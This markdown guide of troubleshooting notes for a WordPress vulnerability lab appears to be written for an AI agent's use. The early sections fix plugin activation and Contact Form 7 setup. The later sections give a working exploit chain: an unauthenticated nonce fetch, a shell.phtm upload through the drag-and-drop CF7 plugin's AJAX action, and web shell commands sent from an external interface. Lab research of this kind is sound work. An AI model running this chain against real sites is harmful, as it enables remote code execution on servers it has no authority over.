# WP Lab Troubleshooting Techniques

Common obstacles when testing WordPress plugin vulnerabilities in a local lab
and the techniques that solve them. These cost significant debugging time
when encountered blind — capturing them here to short-circuit future sessions.

## 1. wp-cli FTP Credentials Prompt

**Symptom:** `wp plugin install`, `wp plugin activate`, `wp plugin list` all
return "To perform the requested action, WordPress needs to access your web
server. Please enter your FTP credentials to proceed."

**Cause:** WordPress filesystem API can't write to `wp-content/` directly.
The `FS_METHOD` constant is not set to `direct`.

**Fix Option A — wp-config.php (preferred):**
Add `define('FS_METHOD', 'direct');` to `wp-config.php`.
If the file is not writable by the current user (e.g., owned by `www-data`),
use the patch tool or `write_file` — both attempt via temp file + rename.

**Fix Option B — MySQL direct activation (when wp-config.php is read-only):**
Bypass wp-cli entirely by updating the `active_plugins` option in the database:

```python
import json

plugins = [
    "plugin-slug/plugin-main-file.php",
    # ... more plugins
]

# Build PHP serialized array — string lengths MUST be exact!
serialized = f"a:{len(plugins)}:{{"
for i, p in enumerate(plugins):
    serialized += f"i:{i};s:{len(p)}:\"{p}\";"
serialized += "}"

# Execute via MySQL
# mysql -u wpuser -p'PASSWORD' wordpress -e "UPDATE wp_options SET option_value='<serialized>' WHERE option_name='active_plugins'"
```

**Critical pitfall:** PHP's `serialize()` format requires exact string lengths
(`s:31:"path/to/file.php"`). If the length is wrong, `unserialize()` fails
silently and `get_option('active_plugins')` returns `false`, causing a
"critical error" white screen. **Always compute lengths programmatically**
(see Python code above), never hardcode them.

**Verify activation worked:**
```bash
# CLI check (may fail if wp-cli still has FTP issue)
cd /var/www/html/wordpress && php -r '
require_once("wp-load.php");
$active = get_option("active_plugins");
if(is_array($active)) {
    echo "Active plugins: " . count($active) . PHP_EOL;
} else {
    echo "ERROR: active_plugins is not an array" . PHP_EOL;
}
'
```

## 2. CF7 Form Tags Not Parsing (scan_form_tags Returns Empty)

**Symptom:** A Contact Form 7 form created via `wp post create` or direct DB
insert has `[mfile* field-name filetypes:*]` in `post_content`, but
`WPCF7_ContactForm::get_instance($id)->scan_form_tags()` returns 0 tags.

**Cause:** CF7 stores form content in the `_form` post meta key, NOT in
`post_content`. When you create a form via `wp post create`, only
`post_content` is set — the `_form` meta is empty. `get_properties()` returns
an empty `form` field, so `scan_form_tags()` finds nothing.

**This affects:** Any plugin that extends CF7 (drag-and-drop-cf7, CF7 addons,
etc.) — they all call `$form->scan_form_tags()` to get field configuration.
If tags are empty, the plugin falls back to default extensions instead of
honoring `filetypes:*` wildcard settings.

**Fix:** Set the `_form` post meta to match `post_content`:

```php
<?php
require_once('/var/www/html/wordpress/wp-load.php');

$form_content = '<label> Upload file
    [mfile* file-upload filetypes:*] </label>

[submit "Upload"]';

update_post_meta($form_id, '_form', $form_content);

// Also set basic mail settings (required for CF7 to consider the form valid)
$mail = array(
    'active' => true,
    'subject' => 'Test',
    'sender' => 'wordpress@example.com',
    'recipient' => 'admin@example.com',
    'body' => 'Test',
    'additional_headers' => '',
    'attachments' => '',
    'use_html' => false,
    'exclude_blank' => false,
);
update_post_meta($form_id, '_mail', $mail);

// Verify
$cf7 = WPCF7_ContactForm::get_instance($form_id);
$props = $cf7->get_properties();
echo "form prop: [" . $props['form'] . "]" . PHP_EOL;
$tags = $cf7->scan_form_tags();
echo "Tags: " . count($tags) . PHP_EOL;
foreach ($tags as $tag) {
    echo "  name=" . $tag->name . " type=" . $tag->type .
         " filetypes=" . var_export($tag->get_option('filetypes', '', true), true) . PHP_EOL;
}
```

**Key detail:** The `upload_name` parameter in the AJAX request must match
the tag `name` attribute (e.g., `file-upload`), NOT the tag type (`mfile`).
If `upload_name` doesn't match any tag name, the plugin falls back to
default extensions, which may reject the payload you're testing.

## 3. Nonce Endpoint Returns 0 (Action Not Found)

**Symptom:** `curl -d "action=some_action" http://target/wp-admin/admin-ajax.php`
returns `0` (HTTP 400 Bad Request) when you expect a JSON response.

**Cause:** The plugin is not active, or the action name is wrong.

**Debugging steps:**
1. Verify the plugin is actually active via `get_option('active_plugins')`
2. Check the exact action name — some plugins use leading underscores
   (e.g., `_wpcf7_check_nonce` → `wp_ajax_nopriv__wpcf7_check_nonce` with
   double underscore)
3. Check if the action is only registered on `wp_ajax_` (authenticated) but
   not `wp_ajax_nopriv_` (unauthenticated)
4. Verify the plugin's main PHP file name matches what's in `active_plugins`
   (e.g., `drag-n-drop-upload-cf7.php` not `drag-and-drop-multiple-file-upload-contact-form-7.php`)

## 4. curl Not Found Inside Bash Heredoc/Compound Commands

**Symptom:** Multi-line bash commands using heredocs or compound statements
(`&&`, `;`) sometimes fail with `curl: command not found` partway through,
even though `curl` works fine in individual commands.

**Cause:** The shell environment inside compound commands can lose PATH
in certain edge cases, particularly after `mktemp` or other binary calls fail.

**Fix:** Split compound commands into individual `terminal()` calls, or use
`python3 -c` with `subprocess` to chain curl commands.

## 5. Determining If .phtm Is a PHP Handler

When testing file upload vulnerabilities with `.phtm` extension, check whether
the target server executes `.phtm` as PHP:

```bash
# Check Apache config for .phtm handler
grep -r "phtm" /etc/apache2/ 2>/dev/null

# Check PHP-FPM pool config
grep -r "phtm" /etc/php/ 2>/dev/null

# Check the default Apache PHP handler pattern
# Common pattern: \.ph(?:ar|p|tml)$ → matches phar, php, phtml but NOT phtm
# cPanel/Plesk: typically includes .phtm explicitly
```

**Key fact:** On Debian/Ubuntu default Apache, `.phtm` is NOT handled as PHP
(the regex `\.ph(?:ar|p|tml)$` doesn't match `phtm`). On cPanel/WHM and Plesk,
`.phtm` IS a PHP handler by default. This determines whether a `.phtm` upload
is "arbitrary file upload" (file disclosure) or "RCE" (code execution).

## 6. Proving RCE When Apache Doesn't Execute .phtm (PHP Built-in Server)

**Symptom:** You've confirmed a `.phtm` file upload succeeds and the file is
web-accessible (HTTP 200), but Apache serves the raw PHP source instead of
executing it. You need to prove RCE for the vulnerability report but can't
modify Apache config (no sudo).

**Cause:** The lab Apache config doesn't include `.phtm` as a PHP handler.
On production cPanel/Plesk servers it would execute, but you need to
demonstrate RCE locally.

**Fix:** Use PHP's built-in server with a custom router script that executes
`.phtm` files as PHP. This simulates a cPanel/Plesk environment without
requiring Apache config changes or sudo.

**Step 1: Create the router script** (`/tmp/phtm_router.php`):
```php
<?php
// Router that executes .phtm files as PHP
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$file = '/tmp' . $uri;  // Adjust base path as needed

if (file_exists($file) && is_file($file)) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if (in_array($ext, ['phtm', 'php', 'phtml', 'php5', 'php7', 'php8'])) {
        chdir(dirname($file));
        include $file;
        return true;
    }
    $mime = mime_content_type($file);
    header('Content-Type: ' . $mime);
    readfile($file);
    return true;
}
http_response_code(404);
echo "404 Not Found";
return true;
```

**Step 2: Start the PHP built-in server on 0.0.0.0:**
```bash
# Use write_file to create the router, then:
php -S 0.0.0.0:8889 /tmp/phtm_router.php &
# Or use terminal(background=true) for the server process
```

**Step 3: Copy the uploaded shell to the server's base directory:**
```bash
cp /var/www/html/wordpress/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{folder}/shell.phtm /tmp/
```

**Step 4: Test RCE (including from external IP):**
```bash
# Local test
curl -s "http://0.0.0.0:8889/shell.phtm?cmd=id"
# → uid=1000(kali) gid=1000(kali) ...

# External test (via VPN interface)
curl -s --interface 10.10.15.2 "http://0.0.0.0:8889/shell.phtm?cmd=id"
# → uid=1000(kali) gid=1000(kali) ...
```

**Key details:**
- The router script MUST use `include` (not `eval` or `file_get_contents`) to
  execute the PHP file in the correct scope
- The `-t` flag alone is NOT enough — PHP built-in server only auto-executes
  `.php` files; `.phtm` requires the router to intercept and `include` them
- Do NOT set the docroot (`-t`) to the WordPress uploads directory directly —
  WordPress's `wp-load.php` auto-loading from parent directories causes DB
  connection errors. Instead, copy the uploaded file to `/tmp` and serve from there
- Use `0.0.0.0` as the bind address to allow testing from external interfaces
  (VPN, other machines) with `curl --interface <vpn_ip>`

**Cleanup:** Kill the server when done:
```bash
pkill -f "php -S 0.0.0.0:8889"
```

## 7. Testing Exploits From External IPs

When the user asks to test "from outside" or "từ bên ngoài", use the
`--interface` flag with curl to bind to a specific network interface:

```bash
# Get nonce from VPN interface
curl -s --interface 10.10.15.2 "http://10.10.16.102/wp-admin/admin-ajax.php" \
  -d "action=_wpcf7_check_nonce" -H "User-Agent: Mozilla/5.0"

# Upload file from VPN interface
curl -s --interface 10.10.15.2 "http://10.10.16.102/wp-admin/admin-ajax.php" \
  -F "action=dnd_codedropz_upload" -F "security=$NONCE" \
  -F "upload-file=@shell.phtm"
```

This simulates a real external attacker hitting the WP lab from the VPN
tunnel, proving the exploit works across network boundaries.
